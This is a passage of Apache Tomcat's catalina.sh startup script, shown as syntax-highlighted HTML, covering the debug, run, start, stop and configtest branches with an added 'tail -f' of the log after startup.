class="variable">$JPDA_SUSPEND</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    JPDA_SUSPEND=<span class="string">&quot;n&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$JPDA_OPTS</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    JPDA_OPTS=<span class="string">&quot;-agentlib:jdwp=transport=<span class="variable">$JPDA_TRANSPORT</span>,address=<span class="variable">$JPDA_ADDRESS</span>,server=y,suspend=<span class="variable">$JPDA_SUSPEND</span>&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  CATALINA_OPTS=<span class="string">&quot;<span class="variable">$JPDA_OPTS</span> <span class="variable">$CATALINA_OPTS</span>&quot;</span></span><br><span class="line">  <span class="built_in">shift</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> = <span class="string">&quot;debug&quot;</span> ] ; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> <span class="variable">$os400</span>; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Debug command not available on OS400&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">shift</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> = <span class="string">&quot;-security&quot;</span> ] ; <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">if</span> [ <span class="variable">$have_tty</span> -eq 1 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Using Security Manager&quot;</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">      <span class="built_in">shift</span></span><br><span class="line">      <span class="built_in">eval</span> <span class="built_in">exec</span> <span class="string">&quot;\&quot;<span class="variable">$_RUNJDB</span>\&quot;&quot;</span> <span class="string">&quot;\&quot;<span class="variable">$CATALINA_LOGGING_CONFIG</span>\&quot;&quot;</span> <span class="variable">$LOGGING_MANAGER</span> <span class="string">&quot;<span class="variable">$JAVA_OPTS</span>&quot;</span> <span class="string">&quot;<span class="variable">$CATALINA_OPTS</span>&quot;</span> \</span><br><span class="line">        -D<span class="variable">$ENDORSED_PROP</span>=<span class="string">&quot;<span class="variable">$JAVA_ENDORSED_DIRS</span>&quot;</span> \</span><br><span class="line">        -classpath <span class="string">&quot;<span class="variable">$CLASSPATH</span>&quot;</span> \</span><br><span class="line">        -sourcepath <span class="string">&quot;<span class="variable">$CATALINA_HOME</span>&quot;</span>/../../java \</span><br><span class="line">        -Djava.security.manager \</span><br><span class="line">        -Djava.security.policy==<span class="string">&quot;<span class="variable">$CATALINA_BASE</span>&quot;</span>/conf/catalina.policy \</span><br><span class="line">        -Dcatalina.base=<span class="string">&quot;<span class="variable">$CATALINA_BASE</span>&quot;</span> \</span><br><span class="line">        -Dcatalina.home=<span class="string">&quot;<span class="variable">$CATALINA_HOME</span>&quot;</span> \</span><br><span class="line">        -Djava.io.tmpdir=<span class="string">&quot;<span class="variable">$CATALINA_TMPDIR</span>&quot;</span> \</span><br><span class="line">        org.apache.catalina.startup.Bootstrap <span class="string">&quot;<span class="variable">$@</span>&quot;</span> start</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">eval</span> <span class="built_in">exec</span> <span class="string">&quot;\&quot;<span class="variable">$_RUNJDB</span>\&quot;&quot;</span> <span class="string">&quot;\&quot;<span class="variable">$CATALINA_LOGGING_CONFIG</span>\&quot;&quot;</span> <span class="variable">$LOGGING_MANAGER</span> <span class="string">&quot;<span class="variable">$JAVA_OPTS</span>&quot;</span> <span class="string">&quot;<span class="variable">$CATALINA_OPTS</span>&quot;</span> \</span><br><span class="line">        -D<span class="variable">$ENDORSED_PROP</span>=<span class="string">&quot;<span class="variable">$JAVA_ENDORSED_DIRS</span>&quot;</span> \</span><br><span class="line">        -classpath <span class="string">&quot;<span class="variable">$CLASSPATH</span>&quot;</span> \</span><br><span class="line">        -sourcepath <span class="string">&quot;<span class="variable">$CATALINA_HOME</span>&quot;</span>/../../java \</span><br><span class="line">        -Dcatalina.base=<span class="string">&quot;<span class="variable">$CATALINA_BASE</span>&quot;</span> \</span><br><span class="line">        -Dcatalina.home=<span class="string">&quot;<span class="variable">$CATALINA_HOME</span>&quot;</span> \</span><br><span class="line">        -Djava.io.tmpdir=<span class="string">&quot;<span class="variable">$CATALINA_TMPDIR</span>&quot;</span> \</span><br><span class="line">        org.apache.catalina.startup.Bootstrap <span class="string">&quot;<span class="variable">$@</span>&quot;</span> start</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> = <span class="string">&quot;run&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">shift</span></span><br><span class="line">  <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> = <span class="string">&quot;-security&quot;</span> ] ; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$have_tty</span> -eq 1 ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;Using Security Manager&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="built_in">shift</span></span><br><span class="line">    <span class="built_in">eval</span> <span class="built_in">exec</span> <span class="string">&quot;\&quot;<span class="variable">$_RUNJAVA</span>\&quot;&quot;</span> <span class="string">&quot;\&quot;<span class="variable">$CATALINA_LOGGING_CONFIG</span>\&quot;&quot;</span> <span class="variable">$LOGGING_MANAGER</span> <span class="string">&quot;<span class="variable">$JAVA_OPTS</span>&quot;</span> <span class="string">&quot;<span class="variable">$CATALINA_OPTS</span>&quot;</span> \</span><br><span class="line">      -D<span class="variable">$ENDORSED_PROP</span>=<span class="string">&quot;\&quot;<span class="variable">$JAVA_ENDORSED_DIRS</span>\&quot;&quot;</span> \</span><br><span class="line">      -classpath <span class="string">&quot;\&quot;<span class="variable">$CLASSPATH</span>\&quot;&quot;</span> \</span><br><span class="line">      -Djava.security.manager \</span><br><span class="line">      -Djava.security.policy==<span class="string">&quot;\&quot;<span class="variable">$CATALINA_BASE</span>/conf/catalina.policy\&quot;&quot;</span> \</span><br><span class="line">      -Dcatalina.base=<span class="string">&quot;\&quot;<span class="variable">$CATALINA_BASE</span>\&quot;&quot;</span> \</span><br><span class="line">      -Dcatalina.home=<span class="string">&quot;\&quot;<span class="variable">$CATALINA_HOME</span>\&quot;&quot;</span> \</span><br><span class="line">      -Djava.io.tmpdir=<span class="string">&quot;\&quot;<span class="variable">$CATALINA_TMPDIR</span>\&quot;&quot;</span> \</span><br><span class="line">      org.apache.catalina.startup.Bootstrap <span class="string">&quot;<span class="variable">$@</span>&quot;</span> start</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">eval</span> <span class="built_in">exec</span> <span class="string">&quot;\&quot;<span class="variable">$_RUNJAVA</span>\&quot;&quot;</span> <span class="string">&quot;\&quot;<span class="variable">$CATALINA_LOGGING_CONFIG</span>\&quot;&quot;</span> <span class="variable">$LOGGING_MANAGER</span> <span class="string">&quot;<span class="variable">$JAVA_OPTS</span>&quot;</span> <span class="string">&quot;<span class="variable">$CATALINA_OPTS</span>&quot;</span> \</span><br><span class="line">      -D<span class="variable">$ENDORSED_PROP</span>=<span class="string">&quot;\&quot;<span class="variable">$JAVA_ENDORSED_DIRS</span>\&quot;&quot;</span> \</span><br><span class="line">      -classpath <span class="string">&quot;\&quot;<span class="variable">$CLASSPATH</span>\&quot;&quot;</span> \</span><br><span class="line">      -Dcatalina.base=<span class="string">&quot;\&quot;<span class="variable">$CATALINA_BASE</span>\&quot;&quot;</span> \</span><br><span class="line">      -Dcatalina.home=<span class="string">&quot;\&quot;<span class="variable">$CATALINA_HOME</span>\&quot;&quot;</span> \</span><br><span class="line">      -Djava.io.tmpdir=<span class="string">&quot;\&quot;<span class="variable">$CATALINA_TMPDIR</span>\&quot;&quot;</span> \</span><br><span class="line">      org.apache.catalina.startup.Bootstrap <span class="string">&quot;<span class="variable">$@</span>&quot;</span> start</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> = <span class="string">&quot;start&quot;</span> ] ; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> [ ! -z <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">if</span> [ -s <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Existing PID file found during start.&quot;</span></span><br><span class="line">        <span class="keyword">if</span> [ -r <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">          PID=`cat <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span>`</span><br><span class="line">          ps -p <span class="variable">$PID</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">          <span class="keyword">if</span> [ $? -eq 0 ] ; <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;Tomcat appears to still be running with PID <span class="variable">$PID</span>. Start aborted.&quot;</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;If the following process is not a Tomcat process, remove the PID file and try again:&quot;</span></span><br><span class="line">            ps -f -p <span class="variable">$PID</span></span><br><span class="line">            <span class="built_in">exit</span> 1</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;Removing/clearing stale PID file.&quot;</span></span><br><span class="line">            rm -f <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">            <span class="keyword">if</span> [ $? != 0 ]; <span class="keyword">then</span></span><br><span class="line">              <span class="keyword">if</span> [ -w <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">                cat /dev/null &gt; <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;Unable to remove or clear stale PID file. Start aborted.&quot;</span></span><br><span class="line">                <span class="built_in">exit</span> 1</span><br><span class="line">              <span class="keyword">fi</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">          <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">echo</span> <span class="string">&quot;Unable to read PID file. Start aborted.&quot;</span></span><br><span class="line">          <span class="built_in">exit</span> 1</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        rm -f <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">        <span class="keyword">if</span> [ $? != 0 ]; <span class="keyword">then</span></span><br><span class="line">          <span class="keyword">if</span> [ ! -w <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;Unable to remove or write to empty PID file. Start aborted.&quot;</span></span><br><span class="line">            <span class="built_in">exit</span> 1</span><br><span class="line">          <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">shift</span></span><br><span class="line">  <span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$CATALINA_OUT_CMD</span>&quot;</span> ] ; <span class="keyword">then</span></span><br><span class="line">    touch <span class="string">&quot;<span class="variable">$CATALINA_OUT</span>&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">if</span> [ ! -e <span class="string">&quot;<span class="variable">$CATALINA_OUT</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">if</span> ! mkfifo <span class="string">&quot;<span class="variable">$CATALINA_OUT</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;cannot create named pipe <span class="variable">$CATALINA_OUT</span>. Start aborted.&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">elif</span> [ ! -p <span class="string">&quot;<span class="variable">$CATALINA_OUT</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$CATALINA_OUT</span> exists and is not a named pipe. Start aborted.&quot;</span></span><br><span class="line">      <span class="built_in">exit</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="variable">$CATALINA_OUT_CMD</span> &lt;<span class="string">&quot;<span class="variable">$CATALINA_OUT</span>&quot;</span> &amp;</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> = <span class="string">&quot;-security&quot;</span> ] ; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$have_tty</span> -eq 1 ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;Using Security Manager&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="built_in">shift</span></span><br><span class="line">    <span class="built_in">eval</span> <span class="variable">$_NOHUP</span> <span class="string">&quot;\&quot;<span class="variable">$_RUNJAVA</span>\&quot;&quot;</span> <span class="string">&quot;\&quot;<span class="variable">$CATALINA_LOGGING_CONFIG</span>\&quot;&quot;</span> <span class="variable">$LOGGING_MANAGER</span> <span class="string">&quot;<span class="variable">$JAVA_OPTS</span>&quot;</span> <span class="string">&quot;<span class="variable">$CATALINA_OPTS</span>&quot;</span> \</span><br><span class="line">      -D<span class="variable">$ENDORSED_PROP</span>=<span class="string">&quot;\&quot;<span class="variable">$JAVA_ENDORSED_DIRS</span>\&quot;&quot;</span> \</span><br><span class="line">      -classpath <span class="string">&quot;\&quot;<span class="variable">$CLASSPATH</span>\&quot;&quot;</span> \</span><br><span class="line">      -Djava.security.manager \</span><br><span class="line">      -Djava.security.policy==<span class="string">&quot;\&quot;<span class="variable">$CATALINA_BASE</span>/conf/catalina.policy\&quot;&quot;</span> \</span><br><span class="line">      -Dcatalina.base=<span class="string">&quot;\&quot;<span class="variable">$CATALINA_BASE</span>\&quot;&quot;</span> \</span><br><span class="line">      -Dcatalina.home=<span class="string">&quot;\&quot;<span class="variable">$CATALINA_HOME</span>\&quot;&quot;</span> \</span><br><span class="line">      -Djava.io.tmpdir=<span class="string">&quot;\&quot;<span class="variable">$CATALINA_TMPDIR</span>\&quot;&quot;</span> \</span><br><span class="line">      org.apache.catalina.startup.Bootstrap <span class="string">&quot;<span class="variable">$@</span>&quot;</span> start \</span><br><span class="line">      &gt;&gt; <span class="string">&quot;<span class="variable">$CATALINA_OUT</span>&quot;</span> 2&gt;&amp;1 <span class="string">&quot;&amp;&quot;</span></span><br><span class="line">      tail -f <span class="variable">$&#123;CATALINA_OUT&#125;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">eval</span> <span class="variable">$_NOHUP</span> <span class="string">&quot;\&quot;<span class="variable">$_RUNJAVA</span>\&quot;&quot;</span> <span class="string">&quot;\&quot;<span class="variable">$CATALINA_LOGGING_CONFIG</span>\&quot;&quot;</span> <span class="variable">$LOGGING_MANAGER</span> <span class="string">&quot;<span class="variable">$JAVA_OPTS</span>&quot;</span> <span class="string">&quot;<span class="variable">$CATALINA_OPTS</span>&quot;</span> \</span><br><span class="line">      -D<span class="variable">$ENDORSED_PROP</span>=<span class="string">&quot;\&quot;<span class="variable">$JAVA_ENDORSED_DIRS</span>\&quot;&quot;</span> \</span><br><span class="line">      -classpath <span class="string">&quot;\&quot;<span class="variable">$CLASSPATH</span>\&quot;&quot;</span> \</span><br><span class="line">      -Dcatalina.base=<span class="string">&quot;\&quot;<span class="variable">$CATALINA_BASE</span>\&quot;&quot;</span> \</span><br><span class="line">      -Dcatalina.home=<span class="string">&quot;\&quot;<span class="variable">$CATALINA_HOME</span>\&quot;&quot;</span> \</span><br><span class="line">      -Djava.io.tmpdir=<span class="string">&quot;\&quot;<span class="variable">$CATALINA_TMPDIR</span>\&quot;&quot;</span> \</span><br><span class="line">      org.apache.catalina.startup.Bootstrap <span class="string">&quot;<span class="variable">$@</span>&quot;</span> start \</span><br><span class="line">      &gt;&gt; <span class="string">&quot;<span class="variable">$CATALINA_OUT</span>&quot;</span> 2&gt;&amp;1 <span class="string">&quot;&amp;&quot;</span></span><br><span class="line">      tail -f <span class="variable">$&#123;CATALINA_OUT&#125;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> [ ! -z <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> $! &gt; <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Tomcat started.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> = <span class="string">&quot;stop&quot;</span> ] ; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">shift</span></span><br><span class="line"></span><br><span class="line">  SLEEP=5</span><br><span class="line">  <span class="keyword">if</span> [ ! -z <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$1</span> | grep <span class="string">&quot;[^0-9]&quot;</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">    <span class="keyword">if</span> [ $? -gt 0 ]; <span class="keyword">then</span></span><br><span class="line">      SLEEP=<span class="variable">$1</span></span><br><span class="line">      <span class="built_in">shift</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  FORCE=0</span><br><span class="line">  <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> = <span class="string">&quot;-force&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">shift</span></span><br><span class="line">    FORCE=1</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> [ ! -z <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">if</span> [ -s <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">kill</span> -0 `cat <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span>` &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">        <span class="keyword">if</span> [ $? -gt 0 ]; <span class="keyword">then</span></span><br><span class="line">          <span class="built_in">echo</span> <span class="string">&quot;PID file found but either no matching process was found or the current user does not have permission to stop the process. Stop aborted.&quot;</span></span><br><span class="line">          <span class="built_in">exit</span> 1</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;PID file is empty and has been ignored.&quot;</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;\$CATALINA_PID was set but the specified file does not exist. Is Tomcat running? Stop aborted.&quot;</span></span><br><span class="line">      <span class="built_in">exit</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">eval</span> <span class="string">&quot;\&quot;<span class="variable">$_RUNJAVA</span>\&quot;&quot;</span> <span class="variable">$LOGGING_MANAGER</span> <span class="string">&quot;<span class="variable">$JAVA_OPTS</span>&quot;</span> \</span><br><span class="line">    -D<span class="variable">$ENDORSED_PROP</span>=<span class="string">&quot;\&quot;<span class="variable">$JAVA_ENDORSED_DIRS</span>\&quot;&quot;</span> \</span><br><span class="line">    -classpath <span class="string">&quot;\&quot;<span class="variable">$CLASSPATH</span>\&quot;&quot;</span> \</span><br><span class="line">    -Dcatalina.base=<span class="string">&quot;\&quot;<span class="variable">$CATALINA_BASE</span>\&quot;&quot;</span> \</span><br><span class="line">    -Dcatalina.home=<span class="string">&quot;\&quot;<span class="variable">$CATALINA_HOME</span>\&quot;&quot;</span> \</span><br><span class="line">    -Djava.io.tmpdir=<span class="string">&quot;\&quot;<span class="variable">$CATALINA_TMPDIR</span>\&quot;&quot;</span> \</span><br><span class="line">    org.apache.catalina.startup.Bootstrap <span class="string">&quot;<span class="variable">$@</span>&quot;</span> stop</span><br><span class="line"></span><br><span class="line">  <span class="comment"># stop failed. Shutdown port disabled? Try a normal kill.</span></span><br><span class="line">  <span class="keyword">if</span> [ $? != 0 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> [ ! -z <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;The stop command failed. Attempting to signal the process to stop through OS signal.&quot;</span></span><br><span class="line">      <span class="built_in">kill</span> -15 `cat <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span>` &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> [ ! -z <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">while</span> [ <span class="variable">$SLEEP</span> -ge 0 ]; <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">kill</span> -0 `cat <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span>` &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">        <span class="keyword">if</span> [ $? -gt 0 ]; <span class="keyword">then</span></span><br><span class="line">          rm -f <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">          <span class="keyword">if</span> [ $? != 0 ]; <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">if</span> [ -w <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">              cat /dev/null &gt; <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span></span><br><span class="line">              <span class="comment"># If Tomcat has stopped don&#x27;t try and force a stop with an empty PID file</span></span><br><span class="line">              FORCE=0</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              <span class="built_in">echo</span> <span class="string">&quot;The PID file could not be removed or cleared.&quot;</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">          <span class="keyword">fi</span></span><br><span class="line">          <span class="built_in">echo</span> <span class="string">&quot;Tomcat stopped.&quot;</span></span><br><span class="line">          <span class="built_in">break</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$SLEEP</span> -gt 0 ]; <span class="keyword">then</span></span><br><span class="line">          sleep 1</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$SLEEP</span> -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">          <span class="built_in">echo</span> <span class="string">&quot;Tomcat did not stop in time.&quot;</span></span><br><span class="line">          <span class="keyword">if</span> [ <span class="variable">$FORCE</span> -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;PID file was not removed.&quot;</span></span><br><span class="line">          <span class="keyword">fi</span></span><br><span class="line">          <span class="built_in">echo</span> <span class="string">&quot;To aid diagnostics a thread dump has been written to standard out.&quot;</span></span><br><span class="line">          <span class="built_in">kill</span> -3 `cat <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span>`</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        SLEEP=`expr <span class="variable">$SLEEP</span> - 1 `</span><br><span class="line">      <span class="keyword">done</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  KILL_SLEEP_INTERVAL=5</span><br><span class="line">  <span class="keyword">if</span> [ <span class="variable">$FORCE</span> -eq 1 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;Kill failed: \$CATALINA_PID not set&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        PID=`cat <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span>`</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Killing Tomcat with the PID: <span class="variable">$PID</span>&quot;</span></span><br><span class="line">        <span class="built_in">kill</span> -9 <span class="variable">$PID</span></span><br><span class="line">        <span class="keyword">while</span> [ <span class="variable">$KILL_SLEEP_INTERVAL</span> -ge 0 ]; <span class="keyword">do</span></span><br><span class="line">            <span class="built_in">kill</span> -0 `cat <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span>` &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">            <span class="keyword">if</span> [ $? -gt 0 ]; <span class="keyword">then</span></span><br><span class="line">                rm -f <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">                <span class="keyword">if</span> [ $? != 0 ]; <span class="keyword">then</span></span><br><span class="line">                    <span class="keyword">if</span> [ -w <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">                        cat /dev/null &gt; <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span></span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        <span class="built_in">echo</span> <span class="string">&quot;The PID file could not be removed.&quot;</span></span><br><span class="line">                    <span class="keyword">fi</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;The Tomcat process has been killed.&quot;</span></span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">            <span class="keyword">if</span> [ <span class="variable">$KILL_SLEEP_INTERVAL</span> -gt 0 ]; <span class="keyword">then</span></span><br><span class="line">                sleep 1</span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">            KILL_SLEEP_INTERVAL=`expr <span class="variable">$KILL_SLEEP_INTERVAL</span> - 1 `</span><br><span class="line">        <span class="keyword">done</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$KILL_SLEEP_INTERVAL</span> -lt 0 ]; <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;Tomcat has not been killed completely yet. The process might be waiting on some system call or might be UNINTERRUPTIBLE.&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> = <span class="string">&quot;configtest&quot;</span> ] ; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">eval</span> <span class="string">&quot;\&quot;<span class="variable">$_RUNJAVA</span>\&quot;&quot;</span> <span class="variable">$LOGGING_MANAGER</span> <span class="string">&quot;<span class="variable">$JAVA_OPTS</span>&quot;</span> \</span><br><span class="line">      -D<span class="variable">$ENDORSED_PROP</span>=<span class="string">&quot;\&quot;<span class="variable">$JAVA_ENDORSED_DIRS</span>\&quot;&quot;</span> \</span><br><span class="line">      -classpath <span class="string">&quot;\&quot;<span 